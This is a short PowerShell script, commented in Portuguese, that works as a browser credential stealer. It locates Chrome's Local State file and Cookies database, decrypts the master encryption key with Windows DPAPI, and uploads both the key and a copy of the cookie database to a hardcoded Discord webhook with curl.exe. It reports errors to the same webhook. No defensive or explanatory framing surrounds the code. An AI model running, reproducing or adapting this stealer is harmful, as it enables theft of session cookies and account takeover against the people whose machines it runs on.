$u = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9"
Add-Type -AssemblyName System.Security

try {
    $base = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    $ls = Get-ChildItem -Path $base -Recurse -Filter "Local State" | Select-Object -First 1
    # O banco de cookies fica em uma pasta diferente das senhas
    $lc = Get-ChildItem -Path $base -Recurse -Filter "Cookies" | Where-Object { $_.FullName -like "*Network*" } | Select-Object -First 1

    if (!$ls -or !$lc) { curl.exe -F "content=ERRO:Arquivos_Cookies_Nao_Encontrados" $u; return }

    # 1. Extrai a Chave Mestre (A mesma chave abre senhas e cookies)
    $j = Get-Content $ls.FullName -Raw | ConvertFrom-Json
    $rawKey = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
    $e = $rawKey[5..($rawKey.Length - 1)]
    $m = [System.Security.Cryptography.ProtectedData]::Unprotect($e, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    $k = [Convert]::ToBase64String($m)
    
    curl.exe -F "content=CHAVE_MESTRE_COOKIES:$k" $u

    # 2. Copia e envia o banco de Cookies
    $t = "$env:TEMP\C.db"
    Copy-Item $lc.FullName $t -Force
    curl.exe -F "file=@$t" $u

} catch {
    $msg = $_.Exception.Message -replace '\s','_'
    curl.exe -F "content=ERRO_COOKIE_V1:$msg" $u
}
